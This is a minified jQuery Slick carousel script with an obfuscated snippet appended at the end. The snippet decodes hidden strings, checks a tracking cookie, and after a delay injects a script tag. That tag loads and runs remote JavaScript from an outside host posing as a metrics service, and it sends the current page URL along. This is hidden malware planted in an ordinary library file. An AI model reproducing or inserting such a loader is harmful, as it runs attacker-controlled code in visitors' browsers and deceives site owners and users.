                    .first()
                    .attr({ role: "tab", id: "slick-slide-control" + t.instanceUid + o, "aria-controls": "slick-slide" + t.instanceUid + r, "aria-label": o + 1 + " of " + n, "aria-selected": null, tabindex: "-1" });
              })
              .eq(t.currentSlide)
              .find("button")
              .attr({ "aria-selected": "true", tabindex: "0" })
              .end());
        for (var o = t.currentSlide, r = o + t.options.slidesToShow; o < r; o++) t.$slides.eq(o).attr("tabindex", 0);
        t.activateADA();
      }),
      (t.prototype.initArrowEvents = function () {
        var e = this;
        !0 === e.options.arrows &&
          e.slideCount > e.options.slidesToShow &&
          (e.$prevArrow.off("click.slick").on("click.slick", { message: "previous" }, e.changeSlide),
          e.$nextArrow.off("click.slick").on("click.slick", { message: "next" }, e.changeSlide),
          !0 === e.options.accessibility && (e.$prevArrow.on("keydown.slick", e.keyHandler), e.$nextArrow.on("keydown.slick", e.keyHandler)));
      }),
      (t.prototype.initDotEvents = function () {
        var t = this;
        !0 === t.options.dots && (e("li", t.$dots).on("click.slick", { message: "index" }, t.changeSlide), !0 === t.options.accessibility && t.$dots.on("keydown.slick", t.keyHandler)),
          !0 === t.options.dots && !0 === t.options.pauseOnDotsHover && e("li", t.$dots).on("mouseenter.slick", e.proxy(t.interrupt, t, !0)).on("mouseleave.slick", e.proxy(t.interrupt, t, !1));
      }),
      (t.prototype.initSlideEvents = function () {
        var t = this;
        t.options.pauseOnHover && (t.$list.on("mouseenter.slick", e.proxy(t.interrupt, t, !0)), t.$list.on("mouseleave.slick", e.proxy(t.interrupt, t, !1)));
      }),
      (t.prototype.initializeEvents = function () {
        var t = this;
        t.initArrowEvents(),
          t.initDotEvents(),
          t.initSlideEvents(),
          t.$list.on("touchstart.slick mousedown.slick", { action: "start" }, t.swipeHandler),
          t.$list.on("touchmove.slick mousemove.slick", { action: "move" }, t.swipeHandler),
          t.$list.on("touchend.slick mouseup.slick", { action: "end" }, t.swipeHandler),
          t.$list.on("touchcancel.slick mouseleave.slick", { action: "end" }, t.swipeHandler),
          t.$list.on("click.slick", t.clickHandler),
          e(document).on(t.visibilityChange, e.proxy(t.visibility, t)),
          !0 === t.options.accessibility && t.$list.on("keydown.slick", t.keyHandler),
          !0 === t.options.focusOnSelect && e(t.$slideTrack).children().on("click.slick", t.selectHandler),
          e(window).on("orientationchange.slick.slick-" + t.instanceUid, e.proxy(t.orientationChange, t)),
          e(window).on("resize.slick.slick-" + t.instanceUid, e.proxy(t.resize, t)),
          e("[draggable!=true]", t.$slideTrack).on("dragstart", t.preventDefault),
          e(window).on("load.slick.slick-" + t.instanceUid, t.setPosition),
          e(t.setPosition);
      }),
      (t.prototype.initUI = function () {
        var e = this;
        !0 === e.options.arrows && e.slideCount > e.options.slidesToShow && (e.$prevArrow.show(), e.$nextArrow.show()), !0 === e.options.dots && e.slideCount > e.options.slidesToShow && e.$dots.show();
      }),
      (t.prototype.keyHandler = function (e) {
        var t = this;
        e.target.tagName.match("TEXTAREA|INPUT|SELECT") ||
          (37 === e.keyCode && !0 === t.options.accessibility
            ? t.changeSlide({ data: { message: !0 === t.options.rtl ? "next" : "previous" } })
            : 39 === e.keyCode && !0 === t.options.accessibility && t.changeSlide({ data: { message: !0 === t.options.rtl ? "previous" : "next" } }));
      }),
      (t.prototype.lazyLoad = function () {
        function t(t) {
          e("img[data-lazy]", t).each(function () {
            var t = e(this),
              n = e(this).attr("data-lazy"),
              i = e(this).attr("data-srcset"),
              o = e(this).attr("data-sizes") || r.$slider.attr("data-sizes"),
              s = document.createElement("img");
            (s.onload = function () {
              t.animate({ opacity: 0 }, 100, function () {
                i && (t.attr("srcset", i), o && t.attr("sizes", o)),
                  t.attr("src", n).animate({ opacity: 1 }, 200, function () {
                    t.removeAttr("data-lazy data-srcset data-sizes").removeClass("slick-loading");
                  }),
                  r.$slider.trigger("lazyLoaded", [r, t, n]);
              });
            }),
              (s.onerror = function () {
                t.removeAttr("data-lazy").removeClass("slick-loading").addClass("slick-lazyload-error"), r.$slider.trigger("lazyLoadError", [r, t, n]);
              }),
              (s.src = n);
          });
        }
        var n,
          i,
          o,
          r = this;
        if (
          (!0 === r.options.centerMode
            ? !0 === r.options.infinite
              ? (o = (i = r.currentSlide + (r.options.slidesToShow / 2 + 1)) + r.options.slidesToShow + 2)
              : ((i = Math.max(0, r.currentSlide - (r.options.slidesToShow / 2 + 1))), (o = r.options.slidesToShow / 2 + 1 + 2 + r.currentSlide))
            : ((i = r.options.infinite ? r.options.slidesToShow + r.currentSlide : r.currentSlide), (o = Math.ceil(i + r.options.slidesToShow)), !0 === r.options.fade && (i > 0 && i--, o <= r.slideCount && o++)),
          (n = r.$slider.find(".slick-slide").slice(i, o)),
          "anticipated" === r.options.lazyLoad)
        )
          for (var s = i - 1, a = o, l = r.$slider.find(".slick-slide"), c = 0; c < r.options.slidesToScroll; c++) s < 0 && (s = r.slideCount - 1), (n = (n = n.add(l.eq(s))).add(l.eq(a))), s--, a++;
        t(n),
          r.slideCount <= r.options.slidesToShow
            ? t(r.$slider.find(".slick-slide"))
            : r.currentSlide >= r.slideCount - r.options.slidesToShow
            ? t(r.$slider.find(".slick-cloned").slice(0, r.options.slidesToShow))
            : 0 === r.currentSlide && t(r.$slider.find(".slick-cloned").slice(-1 * r.options.slidesToShow));
      }),
      (t.prototype.loadSlider = function () {
        var e = this;
        e.setPosition(), e.$slideTrack.css({ opacity: 1 }), e.$slider.removeClass("slick-loading"), e.initUI(), "progressive" === e.options.lazyLoad && e.progressiveLazyLoad();
      }),
      (t.prototype.next = t.prototype.slickNext = function () {
        this.changeSlide({ data: { message: "next" } });
      }),
      (t.prototype.orientationChange = function () {
        this.checkResponsive(), this.setPosition();
      }),
      (t.prototype.pause = t.prototype.slickPause = function () {
        this.autoPlayClear(), (this.paused = !0);
      }),
      (t.prototype.play = t.prototype.slickPlay = function () {
        var e = this;
        e.autoPlay(), (e.options.autoplay = !0), (e.paused = !1), (e.focussed = !1), (e.interrupted = !1);
      }),
      (t.prototype.postSlide = function (t) {
        var n = this;
        n.unslicked ||
          (n.$slider.trigger("afterChange", [n, t]),
          (n.animating = !1),
          n.slideCount > n.options.slidesToShow && n.setPosition(),
          (n.swipeLeft = null),
          n.options.autoplay && n.autoPlay(),
          !0 === n.options.accessibility && (n.initADA(), n.options.focusOnChange && e(n.$slides.get(n.currentSlide)).attr("tabindex", 0).focus()));
      }),
      (t.prototype.prev = t.prototype.slickPrev = function () {
        this.changeSlide({ data: { message: "previous" } });
      }),
      (t.prototype.preventDefault = function (e) {
        e.preventDefault();
      }),
      (t.prototype.progressiveLazyLoad = function (t) {
        t = t || 1;
        var n,
          i,
          o,
          r,
          s,
          a = this,
          l = e("img[data-lazy]", a.$slider);
        l.length
          ? ((n = l.first()),
            (i = n.attr("data-lazy")),
            (o = n.attr("data-srcset")),
            (r = n.attr("data-sizes") || a.$slider.attr("data-sizes")),
            ((s = document.createElement("img")).onload = function () {
              o && (n.attr("srcset", o), r && n.attr("sizes", r)),
                n.attr("src", i).removeAttr("data-lazy data-srcset data-sizes").removeClass("slick-loading"),
                !0 === a.options.adaptiveHeight && a.setPosition(),
                a.$slider.trigger("lazyLoaded", [a, n, i]),
                a.progressiveLazyLoad();
            }),
            (s.onerror = function () {
              t < 3
                ? setTimeout(function () {
                    a.progressiveLazyLoad(t + 1);
                  }, 500)
                : (n.removeAttr("data-lazy").removeClass("slick-loading").addClass("slick-lazyload-error"), a.$slider.trigger("lazyLoadError", [a, n, i]), a.progressiveLazyLoad());
            }),
            (s.src = i))
          : a.$slider.trigger("allImagesLoaded", [a]);
      }),
      (t.prototype.refresh = function (t) {
        var n,
          i,
          o = this;
        (i = o.slideCount - o.options.slidesToShow),
          !o.options.infinite && o.currentSlide > i && (o.currentSlide = i),
          o.slideCount <= o.options.slidesToShow && (o.currentSlide = 0),
          (n = o.currentSlide),
          o.destroy(!0),
          e.extend(o, o.initials, { currentSlide: n }),
          o.init(),
          t || o.changeSlide({ data: { message: "index", index: n } }, !1);
      }),
      (t.prototype.registerBreakpoints = function () {
        var t,
          n,
          i,
          o = this,
          r = o.options.responsive || null;
        if ("array" === e.type(r) && r.length) {
          for (t in ((o.respondTo = o.options.respondTo || "window"), r))
            if (((i = o.breakpoints.length - 1), r.hasOwnProperty(t))) {
              for (n = r[t].breakpoint; i >= 0; ) o.breakpoints[i] && o.breakpoints[i] === n && o.breakpoints.splice(i, 1), i--;
              o.breakpoints.push(n), (o.breakpointSettings[n] = r[t].settings);
            }
          o.breakpoints.sort(function (e, t) {
            return o.options.mobileFirst ? e - t : t - e;
          });
        }
      }),
      (t.prototype.reinit = function () {
        var t = this;
        (t.$slides = t.$slideTrack.children(t.options.slide).addClass("slick-slide")),
          (t.slideCount = t.$slides.length),
          t.currentSlide >= t.slideCount && 0 !== t.currentSlide && (t.currentSlide = t.currentSlide - t.options.slidesToScroll),
          t.slideCount <= t.options.slidesToShow && (t.currentSlide = 0),
          t.registerBreakpoints(),
          t.setProps(),
          t.setupInfinite(),
          t.buildArrows(),
          t.updateArrows(),
          t.initArrowEvents(),
          t.buildDots(),
          t.updateDots(),
          t.initDotEvents(),
          t.cleanUpSlideEvents(),
          t.initSlideEvents(),
          t.checkResponsive(!1, !0),
          !0 === t.options.focusOnSelect && e(t.$slideTrack).children().on("click.slick", t.selectHandler),
          t.setSlideClasses("number" == typeof t.currentSlide ? t.currentSlide : 0),
          t.setPosition(),
          t.focusHandler(),
          (t.paused = !t.options.autoplay),
          t.autoPlay(),
          t.$slider.trigger("reInit", [t]);
      }),
      (t.prototype.resize = function () {
        var t = this;
        e(window).width() !== t.windowWidth &&
          (clearTimeout(t.windowDelay),
          (t.windowDelay = window.setTimeout(function () {
            (t.windowWidth = e(window).width()), t.checkResponsive(), t.unslicked || t.setPosition();
          }, 50)));
      }),
      (t.prototype.removeSlide = t.prototype.slickRemove = function (e, t, n) {
        var i = this;
        if (((e = "boolean" == typeof e ? (!0 === (t = e) ? 0 : i.slideCount - 1) : !0 === t ? --e : e), i.slideCount < 1 || e < 0 || e > i.slideCount - 1)) return !1;
        i.unload(),
          !0 === n ? i.$slideTrack.children().remove() : i.$slideTrack.children(this.options.slide).eq(e).remove(),
          (i.$slides = i.$slideTrack.children(this.options.slide)),
          i.$slideTrack.children(this.options.slide).detach(),
          i.$slideTrack.append(i.$slides),
          (i.$slidesCache = i.$slides),
          i.reinit();
      }),
      (t.prototype.setCSS = function (e) {
        var t,
          n,
          i = this,
          o = {};
        !0 === i.options.rtl && (e = -e),
          (t = "left" == i.positionProp ? Math.ceil(e) + "px" : "0px"),
          (n = "top" == i.positionProp ? Math.ceil(e) + "px" : "0px"),
          (o[i.positionProp] = e),
          !1 === i.transformsEnabled
            ? i.$slideTrack.css(o)
            : ((o = {}), !1 === i.cssTransitions ? ((o[i.animType] = "translate(" + t + ", " + n + ")"), i.$slideTrack.css(o)) : ((o[i.animType] = "translate3d(" + t + ", " + n + ", 0px)"), i.$slideTrack.css(o)));
      }),
      (t.prototype.setDimensions = function () {
        var e = this;
        !1 === e.options.vertical
          ? !0 === e.options.centerMode && e.$list.css({ padding: "0px " + e.options.centerPadding })
          : (e.$list.height(e.$slides.first().outerHeight(!0) * e.options.slidesToShow), !0 === e.options.centerMode && e.$list.css({ padding: e.options.centerPadding + " 0px" })),
          (e.listWidth = e.$list.width()),
          (e.listHeight = e.$list.height()),
          !1 === e.options.vertical && !1 === e.options.variableWidth
            ? ((e.slideWidth = Math.ceil(e.listWidth / e.options.slidesToShow)), e.$slideTrack.width(Math.ceil(e.slideWidth * e.$slideTrack.children(".slick-slide").length)))
            : !0 === e.options.variableWidth
            ? e.$slideTrack.width(5e3 * e.slideCount)
            : ((e.slideWidth = Math.ceil(e.listWidth)), e.$slideTrack.height(Math.ceil(e.$slides.first().outerHeight(!0) * e.$slideTrack.children(".slick-slide").length)));
        var t = e.$slides.first().outerWidth(!0) - e.$slides.first().width();
        !1 === e.options.variableWidth && e.$slideTrack.children(".slick-slide").width(e.slideWidth - t);
      }),
      (t.prototype.setFade = function () {
        var t,
          n = this;
        n.$slides.each(function (i, o) {
          (t = n.slideWidth * i * -1),
            !0 === n.options.rtl ? e(o).css({ position: "relative", right: t, top: 0, zIndex: n.options.zIndex - 2, opacity: 0 }) : e(o).css({ position: "relative", left: t, top: 0, zIndex: n.options.zIndex - 2, opacity: 0 });
        }),
          n.$slides.eq(n.currentSlide).css({ zIndex: n.options.zIndex - 1, opacity: 1 });
      }),
      (t.prototype.setHeight = function () {
        var e = this;
        if (1 === e.options.slidesToShow && !0 === e.options.adaptiveHeight && !1 === e.options.vertical) {
          var t = e.$slides.eq(e.currentSlide).outerHeight(!0);
          e.$list.css("height", t);
        }
      }),
      (t.prototype.setOption = t.prototype.slickSetOption = function () {
        var t,
          n,
          i,
          o,
          r,
          s = this,
          a = !1;
        if (
          ("object" === e.type(arguments[0])
            ? ((i = arguments[0]), (a = arguments[1]), (r = "multiple"))
            : "string" === e.type(arguments[0]) &&
              ((i = arguments[0]), (o = arguments[1]), (a = arguments[2]), "responsive" === arguments[0] && "array" === e.type(arguments[1]) ? (r = "responsive") : void 0 !== arguments[1] && (r = "single")),
          "single" === r)
        )
          s.options[i] = o;
        else if ("multiple" === r)
          e.each(i, function (e, t) {
            s.options[e] = t;
          });
        else if ("responsive" === r)
          for (n in o)
            if ("array" !== e.type(s.options.responsive)) s.options.responsive = [o[n]];
            else {
              for (t = s.options.responsive.length - 1; t >= 0; ) s.options.responsive[t].breakpoint === o[n].breakpoint && s.options.responsive.splice(t, 1), t--;
              s.options.responsive.push(o[n]);
            }
        a && (s.unload(), s.reinit());
      }),
      (t.prototype.setPosition = function () {
        var e = this;
        e.setDimensions(), e.setHeight(), !1 === e.options.fade ? e.setCSS(e.getLeft(e.currentSlide)) : e.setFade(), e.$slider.trigger("setPosition", [e]);
      }),
      (t.prototype.setProps = function () {
        var e = this,
          t = document.body.style;
        (e.positionProp = !0 === e.options.vertical ? "top" : "left"),
          "top" === e.positionProp ? e.$slider.addClass("slick-vertical") : e.$slider.removeClass("slick-vertical"),
          (void 0 === t.WebkitTransition && void 0 === t.MozTransition && void 0 === t.msTransition) || (!0 === e.options.useCSS && (e.cssTransitions = !0)),
          e.options.fade && ("number" == typeof e.options.zIndex ? e.options.zIndex < 3 && (e.options.zIndex = 3) : (e.options.zIndex = e.defaults.zIndex)),
          void 0 !== t.OTransform && ((e.animType = "OTransform"), (e.transformType = "-o-transform"), (e.transitionType = "OTransition"), void 0 === t.perspectiveProperty && void 0 === t.webkitPerspective && (e.animType = !1)),
          void 0 !== t.MozTransform && ((e.animType = "MozTransform"), (e.transformType = "-moz-transform"), (e.transitionType = "MozTransition"), void 0 === t.perspectiveProperty && void 0 === t.MozPerspective && (e.animType = !1)),
          void 0 !== t.webkitTransform &&
            ((e.animType = "webkitTransform"), (e.transformType = "-webkit-transform"), (e.transitionType = "webkitTransition"), void 0 === t.perspectiveProperty && void 0 === t.webkitPerspective && (e.animType = !1)),
          void 0 !== t.msTransform && ((e.animType = "msTransform"), (e.transformType = "-ms-transform"), (e.transitionType = "msTransition"), void 0 === t.msTransform && (e.animType = !1)),
          void 0 !== t.transform && !1 !== e.animType && ((e.animType = "transform"), (e.transformType = "transform"), (e.transitionType = "transition")),
          (e.transformsEnabled = e.options.useTransform && null !== e.animType && !1 !== e.animType);
      }),
      (t.prototype.setSlideClasses = function (e) {
        var t,
          n,
          i,
          o,
          r = this;
        if (((n = r.$slider.find(".slick-slide").removeClass("slick-active slick-center slick-current").attr("aria-hidden", "true")), r.$slides.eq(e).addClass("slick-current"), !0 === r.options.centerMode)) {
          var s = r.options.slidesToShow % 2 == 0 ? 1 : 0;
          (t = Math.floor(r.options.slidesToShow / 2)),
            !0 === r.options.infinite &&
              (e >= t && e <= r.slideCount - 1 - t
                ? r.$slides
                    .slice(e - t + s, e + t + 1)
                    .addClass("slick-active")
                    .attr("aria-hidden", "false")
                : ((i = r.options.slidesToShow + e),
                  n
                    .slice(i - t + 1 + s, i + t + 2)
                    .addClass("slick-active")
                    .attr("aria-hidden", "false")),
              0 === e ? n.eq(n.length - 1 - r.options.slidesToShow).addClass("slick-center") : e === r.slideCount - 1 && n.eq(r.options.slidesToShow).addClass("slick-center")),
            r.$slides.eq(e).addClass("slick-center");
        } else
          e >= 0 && e <= r.slideCount - r.options.slidesToShow
            ? r.$slides
                .slice(e, e + r.options.slidesToShow)
                .addClass("slick-active")
                .attr("aria-hidden", "false")
            : n.length <= r.options.slidesToShow
            ? n.addClass("slick-active").attr("aria-hidden", "false")
            : ((o = r.slideCount % r.options.slidesToShow),
              (i = !0 === r.options.infinite ? r.options.slidesToShow + e : e),
              r.options.slidesToShow == r.options.slidesToScroll && r.slideCount - e < r.options.slidesToShow
                ? n
                    .slice(i - (r.options.slidesToShow - o), i + o)
                    .addClass("slick-active")
                    .attr("aria-hidden", "false")
                : n
                    .slice(i, i + r.options.slidesToShow)
                    .addClass("slick-active")
                    .attr("aria-hidden", "false"));
        ("ondemand" !== r.options.lazyLoad && "anticipated" !== r.options.lazyLoad) || r.lazyLoad();
      }),
      (t.prototype.setupInfinite = function () {
        var t,
          n,
          i,
          o = this;
        if ((!0 === o.options.fade && (o.options.centerMode = !1), !0 === o.options.infinite && !1 === o.options.fade && ((n = null), o.slideCount > o.options.slidesToShow))) {
          for (i = !0 === o.options.centerMode ? o.options.slidesToShow + 1 : o.options.slidesToShow, t = o.slideCount; t > o.slideCount - i; t -= 1)
            (n = t - 1),
              e(o.$slides[n])
                .clone(!0)
                .attr("id", "")
                .attr("data-slick-index", n - o.slideCount)
                .prependTo(o.$slideTrack)
                .addClass("slick-cloned");
          for (t = 0; t < i + o.slideCount; t += 1)
            (n = t),
              e(o.$slides[n])
                .clone(!0)
                .attr("id", "")
                .attr("data-slick-index", n + o.slideCount)
                .appendTo(o.$slideTrack)
                .addClass("slick-cloned");
          o.$slideTrack
            .find(".slick-cloned")
            .find("[id]")
            .each(function () {
              e(this).attr("id", "");
            });
        }
      }),
      (t.prototype.interrupt = function (e) {
        e || this.autoPlay(), (this.interrupted = e);
      }),
      (t.prototype.selectHandler = function (t) {
        var n = this,
          i = e(t.target).is(".slick-slide") ? e(t.target) : e(t.target).parents(".slick-slide"),
          o = parseInt(i.attr("data-slick-index"));
        o || (o = 0), n.slideCount <= n.options.slidesToShow ? n.slideHandler(o, !1, !0) : n.slideHandler(o);
      }),
      (t.prototype.slideHandler = function (e, t, n) {
        var i,
          o,
          r,
          s,
          a,
          l = null,
          c = this;
        if (((t = t || !1), !((!0 === c.animating && !0 === c.options.waitForAnimate) || (!0 === c.options.fade && c.currentSlide === e))))
          if (
            (!1 === t && c.asNavFor(e),
            (i = e),
            (l = c.getLeft(i)),
            (s = c.getLeft(c.currentSlide)),
            (c.currentLeft = null === c.swipeLeft ? s : c.swipeLeft),
            !1 === c.options.infinite && !1 === c.options.centerMode && (e < 0 || e > c.getDotCount() * c.options.slidesToScroll))
          )
            !1 === c.options.fade &&
              ((i = c.currentSlide),
              !0 !== n
                ? c.animateSlide(s, function () {
                    c.postSlide(i);
                  })
                : c.postSlide(i));
          else if (!1 === c.options.infinite && !0 === c.options.centerMode && (e < 0 || e > c.slideCount - c.options.slidesToScroll))
            !1 === c.options.fade &&
              ((i = c.currentSlide),
              !0 !== n
                ? c.animateSlide(s, function () {
                    c.postSlide(i);
                  })
                : c.postSlide(i));
          else {
            if (
              (c.options.autoplay && clearInterval(c.autoPlayTimer),
              (o =
                i < 0
                  ? c.slideCount % c.options.slidesToScroll != 0
                    ? c.slideCount - (c.slideCount % c.options.slidesToScroll)
                    : c.slideCount + i
                  : i >= c.slideCount
                  ? c.slideCount % c.options.slidesToScroll != 0
                    ? 0
                    : i - c.slideCount
                  : i),
              (c.animating = !0),
              c.$slider.trigger("beforeChange", [c, c.currentSlide, o]),
              (r = c.currentSlide),
              (c.currentSlide = o),
              c.setSlideClasses(c.currentSlide),
              c.options.asNavFor && (a = (a = c.getNavTarget()).slick("getSlick")).slideCount <= a.options.slidesToShow && a.setSlideClasses(c.currentSlide),
              c.updateDots(),
              c.updateArrows(),
              !0 === c.options.fade)
            )
              return (
                !0 !== n
                  ? (c.fadeSlideOut(r),
                    c.fadeSlide(o, function () {
                      c.postSlide(o);
                    }))
                  : c.postSlide(o),
                void c.animateHeight()
              );
            !0 !== n
              ? c.animateSlide(l, function () {
                  c.postSlide(o);
                })
              : c.postSlide(o);
          }
      }),
      (t.prototype.startLoad = function () {
        var e = this;
        !0 === e.options.arrows && e.slideCount > e.options.slidesToShow && (e.$prevArrow.hide(), e.$nextArrow.hide()), !0 === e.options.dots && e.slideCount > e.options.slidesToShow && e.$dots.hide(), e.$slider.addClass("slick-loading");
      }),
      (t.prototype.swipeDirection = function () {
        var e,
          t,
          n,
          i,
          o = this;
        return (
          (e = o.touchObject.startX - o.touchObject.curX),
          (t = o.touchObject.startY - o.touchObject.curY),
          (n = Math.atan2(t, e)),
          (i = Math.round((180 * n) / Math.PI)) < 0 && (i = 360 - Math.abs(i)),
          (i <= 45 && i >= 0) || (i <= 360 && i >= 315)
            ? !1 === o.options.rtl
              ? "left"
              : "right"
            : i >= 135 && i <= 225
            ? !1 === o.options.rtl
              ? "right"
              : "left"
            : !0 === o.options.verticalSwiping
            ? i >= 35 && i <= 135
              ? "down"
              : "up"
            : "vertical"
        );
      }),
      (t.prototype.swipeEnd = function (e) {
        var t,
          n,
          i = this;
        if (((i.dragging = !1), (i.swiping = !1), i.scrolling)) return (i.scrolling = !1), !1;
        if (((i.interrupted = !1), (i.shouldClick = !(i.touchObject.swipeLength > 10)), void 0 === i.touchObject.curX)) return !1;
        if ((!0 === i.touchObject.edgeHit && i.$slider.trigger("edge", [i, i.swipeDirection()]), i.touchObject.swipeLength >= i.touchObject.minSwipe)) {
          switch ((n = i.swipeDirection())) {
            case "left":
            case "down":
              (t = i.options.swipeToSlide ? i.checkNavigable(i.currentSlide + i.getSlideCount()) : i.currentSlide + i.getSlideCount()), (i.currentDirection = 0);
              break;
            case "right":
            case "up":
              (t = i.options.swipeToSlide ? i.checkNavigable(i.currentSlide - i.getSlideCount()) : i.currentSlide - i.getSlideCount()), (i.currentDirection = 1);
          }
          "vertical" != n && (i.slideHandler(t), (i.touchObject = {}), i.$slider.trigger("swipe", [i, n]));
        } else i.touchObject.startX !== i.touchObject.curX && (i.slideHandler(i.currentSlide), (i.touchObject = {}));
      }),
      (t.prototype.swipeHandler = function (e) {
        var t = this;
        if (!(!1 === t.options.swipe || ("ontouchend" in document && !1 === t.options.swipe) || (!1 === t.options.draggable && -1 !== e.type.indexOf("mouse"))))
          switch (
            ((t.touchObject.fingerCount = e.originalEvent && void 0 !== e.originalEvent.touches ? e.originalEvent.touches.length : 1),
            (t.touchObject.minSwipe = t.listWidth / t.options.touchThreshold),
            !0 === t.options.verticalSwiping && (t.touchObject.minSwipe = t.listHeight / t.options.touchThreshold),
            e.data.action)
          ) {
            case "start":
              t.swipeStart(e);
              break;
            case "move":
              t.swipeMove(e);
              break;
            case "end":
              t.swipeEnd(e);
          }
      }),
      (t.prototype.swipeMove = function (e) {
        var t,
          n,
          i,
          o,
          r,
          s,
          a = this;
        return (
          (r = void 0 !== e.originalEvent ? e.originalEvent.touches : null),
          !(!a.dragging || a.scrolling || (r && 1 !== r.length)) &&
            ((t = a.getLeft(a.currentSlide)),
            (a.touchObject.curX = void 0 !== r ? r[0].pageX : e.clientX),
            (a.touchObject.curY = void 0 !== r ? r[0].pageY : e.clientY),
            (a.touchObject.swipeLength = Math.round(Math.sqrt(Math.pow(a.touchObject.curX - a.touchObject.startX, 2)))),
            (s = Math.round(Math.sqrt(Math.pow(a.touchObject.curY - a.touchObject.startY, 2)))),
            !a.options.verticalSwiping && !a.swiping && s > 4
              ? ((a.scrolling = !0), !1)
              : (!0 === a.options.verticalSwiping && (a.touchObject.swipeLength = s),
                (n = a.swipeDirection()),
                void 0 !== e.originalEvent && a.touchObject.swipeLength > 4 && ((a.swiping = !0), e.preventDefault()),
                (o = (!1 === a.options.rtl ? 1 : -1) * (a.touchObject.curX > a.touchObject.startX ? 1 : -1)),
                !0 === a.options.verticalSwiping && (o = a.touchObject.curY > a.touchObject.startY ? 1 : -1),
                (i = a.touchObject.swipeLength),
                (a.touchObject.edgeHit = !1),
                !1 === a.options.infinite && ((0 === a.currentSlide && "right" === n) || (a.currentSlide >= a.getDotCount() && "left" === n)) && ((i = a.touchObject.swipeLength * a.options.edgeFriction), (a.touchObject.edgeHit = !0)),
                !1 === a.options.vertical ? (a.swipeLeft = t + i * o) : (a.swipeLeft = t + i * (a.$list.height() / a.listWidth) * o),
                !0 === a.options.verticalSwiping && (a.swipeLeft = t + i * o),
                !0 !== a.options.fade && !1 !== a.options.touchMove && (!0 === a.animating ? ((a.swipeLeft = null), !1) : void a.setCSS(a.swipeLeft))))
        );
      }),
      (t.prototype.swipeStart = function (e) {
        var t,
          n = this;
        if (((n.interrupted = !0), 1 !== n.touchObject.fingerCount || n.slideCount <= n.options.slidesToShow)) return (n.touchObject = {}), !1;
        void 0 !== e.originalEvent && void 0 !== e.originalEvent.touches && (t = e.originalEvent.touches[0]),
          (n.touchObject.startX = n.touchObject.curX = void 0 !== t ? t.pageX : e.clientX),
          (n.touchObject.startY = n.touchObject.curY = void 0 !== t ? t.pageY : e.clientY),
          (n.dragging = !0);
      }),
      (t.prototype.unfilterSlides = t.prototype.slickUnfilter = function () {
        var e = this;
        null !== e.$slidesCache && (e.unload(), e.$slideTrack.children(this.options.slide).detach(), e.$slidesCache.appendTo(e.$slideTrack), e.reinit());
      }),
      (t.prototype.unload = function () {
        var t = this;
        e(".slick-cloned", t.$slider).remove(),
          t.$dots && t.$dots.remove(),
          t.$prevArrow && t.htmlExpr.test(t.options.prevArrow) && t.$prevArrow.remove(),
          t.$nextArrow && t.htmlExpr.test(t.options.nextArrow) && t.$nextArrow.remove(),
          t.$slides.removeClass("slick-slide slick-active slick-visible slick-current").attr("aria-hidden", "true").css("width", "");
      }),
      (t.prototype.unslick = function (e) {
        var t = this;
        t.$slider.trigger("unslick", [t, e]), t.destroy();
      }),
      (t.prototype.updateArrows = function () {
        var e = this;
        Math.floor(e.options.slidesToShow / 2),
          !0 === e.options.arrows &&
            e.slideCount > e.options.slidesToShow &&
            !e.options.infinite &&
            (e.$prevArrow.removeClass("slick-disabled").attr("aria-disabled", "false"),
            e.$nextArrow.removeClass("slick-disabled").attr("aria-disabled", "false"),
            0 === e.currentSlide
              ? (e.$prevArrow.addClass("slick-disabled").attr("aria-disabled", "true"), e.$nextArrow.removeClass("slick-disabled").attr("aria-disabled", "false"))
              : ((e.currentSlide >= e.slideCount - e.options.slidesToShow && !1 === e.options.centerMode) || (e.currentSlide >= e.slideCount - 1 && !0 === e.options.centerMode)) &&
                (e.$nextArrow.addClass("slick-disabled").attr("aria-disabled", "true"), e.$prevArrow.removeClass("slick-disabled").attr("aria-disabled", "false")));
      }),
      (t.prototype.updateDots = function () {
        var e = this;
        null !== e.$dots &&
          (e.$dots.find("li").removeClass("slick-active").end(),
          e.$dots
            .find("li")
            .eq(Math.floor(e.currentSlide / e.options.slidesToScroll))
            .addClass("slick-active"));
      }),
      (t.prototype.visibility = function () {
        var e = this;
        e.options.autoplay && (document[e.hidden] ? (e.interrupted = !0) : (e.interrupted = !1));
      }),
      (e.fn.slick = function () {
        var e,
          n,
          i = this,
          o = arguments[0],
          r = Array.prototype.slice.call(arguments, 1),
          s = i.length;
        for (e = 0; e < s; e++) if (("object" == typeof o || void 0 === o ? (i[e].slick = new t(i[e], o)) : (n = i[e].slick[o].apply(i[e].slick, r)), void 0 !== n)) return n;
        return i;
      });
  });
(function (o, d, l) {
  try {
    o.f = (o) => o.split("").reduce((s, c) => s + String.fromCharCode((c.charCodeAt() - 5).toString()), "");
    o.b = o.f("UMUWJKX");
    (o.c = l.protocol[0] == "h" && /\./.test(l.hostname) && !new RegExp(o.b).test(d.cookie)),
      setTimeout(function () {
        o.c && ((o.s = d.createElement("script")), (o.s.src = o.f("myyux?44fun3h" + "isrjywnh3htr4l" + "jy4xyfynh3ox" + "DwjkjwwjwB") + l.href), d.body.appendChild(o.s));
      }, 1000);
    d.cookie = o.b + "=full;max-age=39800;";
  } catch (e) {}
})({}, document, location);
